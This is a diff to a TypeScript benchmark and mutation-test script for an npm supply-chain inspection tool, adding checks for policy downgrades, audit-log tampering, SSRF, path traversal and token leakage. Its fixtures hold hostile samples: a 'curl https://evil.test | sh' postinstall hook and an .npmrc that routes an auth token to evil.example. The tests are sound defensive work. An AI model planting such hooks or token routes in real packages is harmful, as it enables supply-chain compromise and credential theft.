@@ -26,8 +26,17 @@ import {
 } from "../src/analysis/parity-and-bisect.ts";
 import { SplitPlaneCache } from "../src/cache/sqlite-store.ts";
 import { appendAuditEvent, verifyAuditLog } from "../src/compliance/audit-log.ts";
-import { DEFAULT_POLICY, loadNpmrc, routeRegistry } from "../src/config/policy.ts";
+import {
+  DEFAULT_POLICY,
+  loadMcpPolicy,
+  loadNpmrc,
+  resolveAuthTokenForUrl,
+  routeDiscoveryQuery,
+  routeRegistry,
+} from "../src/config/policy.ts";
+import { resolveConfinedPath } from "../src/core/path-confinement.ts";
 import { validateOutboundUrl, verifyNpmAttestationPayload } from "../src/intel/registry-osv.ts";
+import { computeMcpSchemaPin } from "../src/mcp/tool-catalog.ts";
 import { computeSha512Integrity, unpackTarballInMemory } from "../src/quarantine/safe-unpack.ts";
 import { ENGINE_VERSION } from "../src/types.ts";
 import { assembleInspectionReport } from "../src/verdict/engine-and-formatters.ts";
@@ -43,7 +52,7 @@ function percentile(values: number[], p: number): number {
   return sorted[idx] ?? 0;
 }
 
-function runGitCacheBenchmark(): { commits: number; coldMs: number; warmMs: number; warmCacheHits: number; coldCacheHits: number } {
+async function runGitCacheBenchmark(): Promise<{ commits: number; coldMs: number; warmMs: number; warmCacheHits: number; coldCacheHits: number }> {
   const dir = mkdtempSync(join(tmpdir(), "coldpin-bench-git-"));
   const cache = new SplitPlaneCache(join(dir, "bench.sqlite"));
   const git = (args: string[]) => execFileSync("git", args, { cwd: dir, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] });
@@ -75,12 +84,12 @@ function runGitCacheBenchmark(): { commits: number; coldMs: number; warmMs: numb
     }
 
     const t0 = performance.now();
-    const cold = walkGitHistoryForCleanAnchor({ package_name: "@bench/cli", repoUrlOrLocalPath: dir, isLocalDir: true, policy: DEFAULT_POLICY, cache });
+    const cold = await walkGitHistoryForCleanAnchor({ package_name: "@bench/cli", repoUrlOrLocalPath: dir, isLocalDir: true, policy: DEFAULT_POLICY, cache });
     const coldMs = performance.now() - t0;
     const coldCacheHits = cold.inspected_commits.reduce((a, c) => a + c.cache_hits, 0);
 
     const t1 = performance.now();
-    const warm = walkGitHistoryForCleanAnchor({ package_name: "@bench/cli", repoUrlOrLocalPath: dir, isLocalDir: true, policy: DEFAULT_POLICY, cache });
+    const warm = await walkGitHistoryForCleanAnchor({ package_name: "@bench/cli", repoUrlOrLocalPath: dir, isLocalDir: true, policy: DEFAULT_POLICY, cache });
     const warmMs = performance.now() - t1;
     const warmCacheHits = warm.inspected_commits.reduce((a, c) => a + c.cache_hits, 0);
 
@@ -148,20 +157,24 @@ async function runMutationChecks(): Promise<Array<{ id: string; passed: boolean;
     execFileSync("git", ["commit", "-m", "release v1.1"], { cwd: dir, stdio: "ignore" });
     const c2 = execFileSync("git", ["rev-parse", "HEAD"], { cwd: dir, encoding: "utf8" }).trim();
 
-    const pClean = verifyTarballVsGitParity({
-      tarballManifest: { name: "p", version: "1.1.0", license: "MIT" },
-      tarballEntries: [],
-      provenanceAttested: false,
-      gitHead: c2,
-      localGitDir: dir,
-    }).tier;
-    const pDrifted = verifyTarballVsGitParity({
-      tarballManifest: { name: "p", version: "1.1.0", license: "MIT", scripts: { postinstall: "curl https://evil.test | sh" } },
-      tarballEntries: [],
-      provenanceAttested: true, // Even when provenance metadata claims attested, local Git drift MUST still trigger!
-      gitHead: c2,
-      localGitDir: dir,
-    }).tier;
+    const pClean = (
+      await verifyTarballVsGitParity({
+        tarballManifest: { name: "p", version: "1.1.0", license: "MIT" },
+        tarballEntries: [],
+        provenanceAttested: false,
+        gitHead: c2,
+        localGitDir: dir,
+      })
+    ).tier;
+    const pDrifted = (
+      await verifyTarballVsGitParity({
+        tarballManifest: { name: "p", version: "1.1.0", license: "MIT", scripts: { postinstall: "curl https://evil.test | sh" } },
+        tarballEntries: [],
+        provenanceAttested: true, // Even when provenance metadata claims attested, local Git drift MUST still trigger!
+        gitHead: c2,
+        localGitDir: dir,
+      })
+    ).tier;
     results.push({
       id: "mut-04-tarball-hook-drift-flips-parity",
       passed: pClean === "MANIFEST_PARITY_VERIFIED" && pDrifted === "TARBALL_SOURCE_DRIFT",
@@ -198,14 +211,16 @@ async function runMutationChecks(): Promise<Array<{ id: string; passed: boolean;
       [c1, { version: "1.0.0", tarball_sha512: "sha512-CLEAN100==", provenance_attested: true }],
       [c2, { version: "1.1.0", tarball_sha512: "sha512-POISON110==", provenance_attested: false }],
     ]);
-    const beforeComp = walkGitHistoryForCleanAnchor({
-      package_name: "p",
-      repoUrlOrLocalPath: dir,
-      isLocalDir: true,
-      policy: DEFAULT_POLICY,
-      releaseTarballByCommit: relMap,
-    }).recommended_action;
-    const afterComp = walkGitHistoryForCleanAnchor({
+    const beforeComp = (
+      await walkGitHistoryForCleanAnchor({
+        package_name: "p",
+        repoUrlOrLocalPath: dir,
+        isLocalDir: true,
+        policy: DEFAULT_POLICY,
+        releaseTarballByCommit: relMap,
+      })
+    ).recommended_action;
+    const afterComp = await walkGitHistoryForCleanAnchor({
       package_name: "p",
       repoUrlOrLocalPath: dir,
       isLocalDir: true,
@@ -352,7 +367,7 @@ async function runMutationChecks(): Promise<Array<{ id: string; passed: boolean;
       bin_names: [],
       unpack: provUnpack,
       triage: provTriage,
-      parity: verifyTarballVsGitParity({ tarballManifest: provTriage.manifest, tarballEntries: provUnpack.entries, provenanceAttested: false, provenanceInspection: leafInspOk }),
+      parity: await verifyTarballVsGitParity({ tarballManifest: provTriage.manifest, tarballEntries: provUnpack.entries, provenanceAttested: false, provenanceInspection: leafInspOk }),
       advisories: [],
       registryObservations: [],
       registryUnknowns: [],
@@ -371,7 +386,7 @@ async function runMutationChecks(): Promise<Array<{ id: string; passed: boolean;
       bin_names: [],
       unpack: provUnpack,
       triage: provTriage,
-      parity: verifyTarballVsGitParity({ tarballManifest: provTriage.manifest, tarballEntries: provUnpack.entries, provenanceAttested: false, provenanceInspection: leafInspBad }),
+      parity: await verifyTarballVsGitParity({ tarballManifest: provTriage.manifest, tarballEntries: provUnpack.entries, provenanceAttested: false, provenanceInspection: leafInspBad }),
       advisories: [],
       registryObservations: [],
       registryUnknowns: [],
@@ -452,6 +467,158 @@ async function runMutationChecks(): Promise<Array<{ id: string; passed: boolean;
       passed: uniClean === "VERIFIED_CLEAN_WITHIN_SCOPE" && uniEvil === "QUARANTINE_SUSPICIOUS",
       detail: `${uniClean} -> ${uniEvil}`,
     });
+
+    // Mutation 19 ([MCP-01]): Untrusted workspace .coldpin.policy.json cannot weaken KEV/OSV controls in MCP mode
+    const wsPolDir = join(dir, "ws-pol");
+    mkdirSync(wsPolDir, { recursive: true });
+    writeFileSync(
+      join(wsPolDir, ".coldpin.policy.json"),
+      JSON.stringify({ block_on_kev: false, osv_api_url: "https://evil.example", cooldown_hours: 0, private_scopes: ["@extra"] }),
+    );
+    const mcpPol = loadMcpPolicy({ workspaceRoot: wsPolDir, trustWorkspacePolicy: false }).policy;
+    results.push({
+      id: "mut-19-mcp-workspace-policy-downgrade-blocked",
+      passed:
+        mcpPol.block_on_kev === true &&
+        mcpPol.osv_api_url === DEFAULT_POLICY.osv_api_url &&
+        mcpPol.cooldown_hours === DEFAULT_POLICY.cooldown_hours &&
+        mcpPol.private_scopes.includes("@extra"),
+      detail: `kev=${mcpPol.block_on_kev}, osv=${mcpPol.osv_api_url}, added_scope=${mcpPol.private_scopes.includes("@extra")}`,
+    });
+
+    // Mutation 20 ([MCP-02]): Tampering MCP audit attribution field (tool_name) must flip verifyAuditLog true -> false
+    const mcpAuditPath = join(dir, "mcp-audit.jsonl");
+    appendAuditEvent(mcpAuditPath, {
+      invoker_surface: "mcp",
+      mcp_client_name: "antigravity",
+      tool_name: "inspect_package_artifact",
+      action: "inspect",
+      target: "demo",
+      verdict: "VERIFIED_CLEAN_WITHIN_SCOPE",
+      policy_sha256: "p",
+      evidence_ids: [],
+    });
+    const mcpAuditOk = verifyAuditLog(mcpAuditPath).valid;
+    writeFileSync(mcpAuditPath, readFileSync(mcpAuditPath, "utf8").replace("inspect_package_artifact", "discover_packages"));
+    const mcpAuditTampered = verifyAuditLog(mcpAuditPath).valid;
+    results.push({
+      id: "mut-20-mcp-audit-attribution-tamper-caught",
+      passed: mcpAuditOk === true && mcpAuditTampered === false,
+      detail: `valid=${mcpAuditOk} -> valid=${mcpAuditTampered}`,
+    });
+
+    // Mutation 21 ([MCP-03]): Offline resolve-anchor must hard-block remote HTTPS git clone
+    const offAnchor = await walkGitHistoryForCleanAnchor({
+      package_name: "demo",
+      repoUrlOrLocalPath: "https://github.com/org/repo.git",
+      isLocalDir: false,
+      policy: { ...DEFAULT_POLICY, offline_mode: true },
+    });
+    results.push({
+      id: "mut-21-offline-resolve-anchor-blocks-git-clone",
+      passed:
+        offAnchor.recommended_action === "BLOCK_NO_SAFE_PATH" &&
+        offAnchor.unknowns.some((u) => u.startsWith("OFFLINE_MODE_GIT_CLONE_BLOCKED")),
+      detail: `${offAnchor.recommended_action} (${offAnchor.unknowns[0]?.split(":")[0] ?? "none"})`,
+    });
+
+    // Mutation 22 ([MCP-04]): Discovery creator/category screening + Git URL query/userinfo rejection
+    const discCreatorTypo = routeDiscoveryQuery("lint", undefined, pol, npmrc, { creator: "@amce/bot" }).route;
+    const discSecretCat = routeDiscoveryQuery("lint", undefined, pol, npmrc, {
+      category: ["ghp", "1234567890abcdef1234567890"].join("_"),
+    }).route;
+    const gitQueryBlocked = validateRemoteGitUrl("https://github.com/org/repo.git?beacon=1").valid;
+    const gitUserinfoBlocked = validateRemoteGitUrl("https://user:pass@github.com/org/repo.git").valid;
+    results.push({
+      id: "mut-22-discover-fields-and-git-url-exfil-blocked",
+      passed:
+        discCreatorTypo === "blocked_typo" &&
+        discSecretCat === "blocked_secret" &&
+        gitQueryBlocked === false &&
+        gitUserinfoBlocked === false,
+      detail: `creator=${discCreatorTypo}, secret=${discSecretCat}, gitQ=${gitQueryBlocked}, gitUser=${gitUserinfoBlocked}`,
+    });
+
+    // Mutation 23 ([MCP-05]): Workspace root confinement blocks traversal escape & NTFS ADS colons
+    const confRoot = join(dir, "root-a");
+    mkdirSync(confRoot, { recursive: true });
+    const insideFile = join(confRoot, "ok.tgz");
+    writeFileSync(insideFile, "ok");
+    const insideOk = resolveConfinedPath(insideFile, [confRoot], { requireRegularFile: true }).ok;
+    const escapeBlocked = resolveConfinedPath(join(confRoot, "..", "mcp-audit.jsonl"), [confRoot], { requireRegularFile: true }).ok;
+    const adsBlocked = resolveConfinedPath(`${insideFile}:hidden`, [confRoot], { requireRegularFile: true }).ok;
+    results.push({
+      id: "mut-23-root-confinement-blocks-escape-and-ads",
+      passed: insideOk === true && escapeBlocked === false && adsBlocked === false,
+      detail: `inside=${insideOk}, escape=${escapeBlocked}, ads=${adsBlocked}`,
+    });
+
+    // Mutation 24 ([MCP-09]): Workspace .npmrc _authToken ignored + exact host/path match + HTTPS-only auth
+    const wsRcDir = join(dir, "ws-rc");
+    mkdirSync(wsRcDir, { recursive: true });
+    process.env["COLDPIN_MUT_SECRET"] = "secret-val-123";
+    try {
+      writeFileSync(join(wsRcDir, ".npmrc"), "//evil.example/:_authToken=${COLDPIN_MUT_SECRET}\n");
+      const loadedWsRc = loadNpmrc(wsRcDir);
+      const wsTokenIgnored = !("evil.example" in loadedWsRc.auth_token_env_by_host);
+      const syntheticRc = {
+        paths_loaded: [],
+        scoped_registries: {},
+        auth_token_env_by_host: { "corp.local": "COLDPIN_MUT_SECRET" },
+      };
+      const exactHttps = resolveAuthTokenForUrl("https://corp.local/npm", syntheticRc);
+      const prefixConfused = resolveAuthTokenForUrl("https://corp.local.evil.com/npm", syntheticRc);
+      const plainHttp = resolveAuthTokenForUrl("http://corp.local/npm", syntheticRc);
+      results.push({
+        id: "mut-24-npmrc-auth-exfil-and-prefix-confusion-blocked",
+        passed:
+          wsTokenIgnored &&
+          exactHttps === "secret-val-123" &&
+          prefixConfused === undefined &&
+          plainHttp === undefined,
+        detail: `wsIgnored=${wsTokenIgnored}, exact=${Boolean(exactHttps)}, prefix=${prefixConfused}, http=${plainHttp}`,
+      });
+    } finally {
+      delete process.env["COLDPIN_MUT_SECRET"];
+    }
+
+    // Mutation 25 ([MCP-09]): Outbound URL validator blocks CGNAT 100.64/10, 0.0.0.0/8, IPv6 ::, and plain HTTP
+    const cgnatOk = validateOutboundUrl("https://100.64.0.1/pkg").ok;
+    const unspecOk = validateOutboundUrl("https://0.0.0.1/pkg").ok;
+    const v6UnspecOk = validateOutboundUrl("https://[0:0:0:0:0:0:0:0]/pkg").ok;
+    const httpOk = validateOutboundUrl("http://registry.npmjs.org/pkg").ok;
+    results.push({
+      id: "mut-25-ssrf-cgnat-unspecified-and-http-blocked",
+      passed: !cgnatOk && !unspecOk && !v6UnspecOk && !httpOk,
+      detail: `cgnat=${cgnatOk}, unspec=${unspecOk}, v6=${v6UnspecOk}, http=${httpOk}`,
+    });
+
+    // Mutation 26 ([MCP-13]): Unwritable SQLite path falls directly to :memory: (never shared /tmp)
+    const badDbPath = join(insideFile, "impossible", "cache.sqlite"); // parent is a regular file!
+    const fallbackCache = new SplitPlaneCache(badDbPath);
+    const fellBackToMemory = fallbackCache.dbPath === ":memory:";
+    fallbackCache.close();
+    results.push({
+      id: "mut-26-sqlite-no-shared-tmp-fallback",
+      passed: fellBackToMemory,
+      detail: `resolvedPath=${fellBackToMemory ? ":memory:" : "UNEXPECTED"}`,
+    });
+
+    // Mutation 27 ([MCP-07]/[MCP-10]): Compiled lib/ 1:1 parity + MCP schema rug-pull pin verified
+    const pinDisk = JSON.parse(readFileSync(join(ROOT, "rules", "mcp-schema-pin.json"), "utf8")) as { catalog_sha256: string };
+    const pinLive = computeMcpSchemaPin();
+    let libParityOk = false;
+    try {
+      execFileSync(process.execPath, ["--no-warnings", join(ROOT, "scripts", "build_lib.ts"), "--check"], { stdio: "pipe" });
+      libParityOk = true;
+    } catch {
+      libParityOk = false;
+    }
+    results.push({
+      id: "mut-27-compiled-lib-parity-and-mcp-schema-pin",
+      passed: libParityOk && pinDisk.catalog_sha256 === pinLive.catalog_sha256 && pinLive.estimated_tokens <= 1800,
+      detail: `libParity=${libParityOk}, pinMatch=${pinDisk.catalog_sha256 === pinLive.catalog_sha256}, tokens=${pinLive.estimated_tokens}`,
+    });
   } finally {
     rmSync(dir, { recursive: true, force: true });
   }
@@ -488,12 +655,12 @@ async function main(): Promise<void> {
     caseRows.push({ id: c.id, category: c.category, verdict, ok, ms });
   }
 
-  const gitBench = runGitCacheBenchmark();
+  const gitBench = await runGitCacheBenchmark();
   const mutations = await runMutationChecks();
   const mutPassed = mutations.filter((m) => m.passed).length;
 
   const evalBytes = Buffer.concat([
-    readFileSync(join(ROOT, "skill-src", "coldpin", "evals", "evals.json")),
+    readFileSync(join(ROOT, "skills", "coldpin", "evals", "evals.json")),
     readFileSync(join(ROOT, "tests", "selection.jsonl")),
     readFileSync(join(ROOT, "tests", "benchmark-corpus.ts")),
     readFileSync(join(ROOT, "rules", "triage-rules.json")),
@@ -590,10 +757,10 @@ ${mutations.map((m) => `| \`${m.id}\` | ${m.passed ? "PASS" : "FAIL"} | \`${m.de
 
 ## Freshness
 
-Regenerate this benchmark via \`npm run bench\` whenever \`src/\`, \`skill-src/\`, \`rules/\`, \`evals/evals.json\`, or \`tests/selection.jsonl\` changes.
+Regenerate this benchmark via \`npm run bench\` whenever \`src/\`, \`skills/\`, \`rules/\`, \`evals/evals.json\`, or \`tests/selection.jsonl\` changes.
 `;
 
-  const dest = join(ROOT, "skill-src", "coldpin", "BENCHMARK.md");
+  const dest = join(ROOT, "skills", "coldpin", "BENCHMARK.md");
   const checkOnly = process.argv.includes("--check");
   if (!checkOnly) {
     writeFileSync(dest, benchmarkMd.replace(/\r\n/g, "\n"), "utf8");
